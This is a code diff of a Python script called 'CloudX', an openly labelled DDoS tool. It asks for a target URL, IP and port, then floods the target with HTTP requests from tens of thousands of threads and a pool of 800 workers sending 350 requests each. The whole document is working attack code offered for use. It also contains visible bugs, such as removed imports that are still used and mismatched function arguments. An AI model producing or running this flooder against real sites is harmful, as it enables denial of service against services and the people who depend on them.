@@ -1,20 +1,18 @@
 import threading
-import socket
-import sys
-import ssl
-import os
-import urllib.request
-import urllib.error
+import requests
 import random
+import os
 import time
+import socket
+import ssl
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
 
 os.system('clear')
-print("POST Method is currently being fixed and it is error right now, please use GET instead.")
 logo = """
 < =============== >
       CloudX
 ^ <=============> ^
-
 """
 print(logo)
 
@@ -30,9 +28,10 @@ url = input("[+] Enter a URL to attack: ")
 ip = input("[+] Enter the target IP address: ")
 port = input("[+] Enter the target port (default: 80): ")
 numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
-method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
+method = input("[+] Type GET ( POST method is currently error rn ): ")
 print("[CHECK TRAFFIC!]")
-time.sleep(0.5)
+print("-----------------")
+time.sleep(1.5)
 
 if port == "":
     port = str(80)
@@ -87,34 +86,23 @@ USER_AGENT_PARTS = {
 }
 
 def attack(ip, port, threadNum):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    request = urllib.request.Request(url, None, headers)
     while True:
         try:
-            if method == "GET":
-                urlsocket_file = urllib.request.urlopen(url)
+            if method  == "GET":
+                urlsocket_file = urllib.request.urlopen(request)
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.connect((ip, int(port)))
-                    payload = ("POST /%s HTTP/1.1\r\n" % (url)).encode('utf-8')
-                    payload += ("Host: %s\r\n" % (url)).encode('utf-8')
-                    payload += "Content-Length: 0\r\n".encode('utf-8')
-                    payload += "\r\n".encode('utf-8')
-                    s.sendall(payload)
+                s.connect((ip, int(port)))
+                s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
+                s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
+                s.close()
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
         except urllib.error.URLError as e:
-            print("[*] Thread (%s) | Error! CloudX can't reach the target URL!" % (threadNum))
+            print("[*] Thread (%s) | Error! seems like CloudX can't reach the target url!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
             break
-
-def workers():
-    while True:
-        for i in range(1000):
-            threading.Thread(target=attack, args=(ip, port, i)).start()
-        time.sleep(1200)
-
-threading.Thread(target=workers).start()
-
-print("[+] DDoS attack started! Enjoy your 'boom' responsibly! 💣🔥")
 
 def flood_url():
     while True:
@@ -128,5 +116,38 @@ def flood_url():
         request = urllib.request.Request(url, None, headers)
         urllib.request.urlopen(request)
 
-# GASS MANG
+def concurrent_attack(threadNum, requests_per_worker):
+    session = requests.Session()
+    session.headers.update(headers)
+    for _ in range(requests_per_worker):
+        try:
+            if method == "GET":
+                response = session.get(url)
+                print("[*] Worker (%s) | Attack Sent! Status Code: %s" % (threadNum, response.status_code))
+            else:
+                response = session.post(url)
+                print("[*] Worker (%s) | Attack Sent! Status Code: %s" % (threadNum, response.status_code))
+        except requests.RequestException as e:
+            print("[*] Worker (%s) | Request failed! Error: %s" % (threadNum, str(e)))
+
+def workers(num_workers, requests_per_worker):
+    with ThreadPoolExecutor(max_workers=num_workers) as executor:
+        for i in range(num_workers):
+            executor.submit(concurrent_attack, i, requests_per_worker)
+
+default_threads = 24000
+for i in range(default_threads):
+    threading.Thread(target=attack, args=(i,)).start()
 threading.Thread(target=flood_url).start()
+
+num_workers = 800
+requests_per_worker = 350
+
+# GAS AE MANG!!
+threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()
+threading.Thread(target=flood_url).start()
+
+# NOTE
+"""
+CloudX is under development, so don't have high expectations about this. alright?
+"""
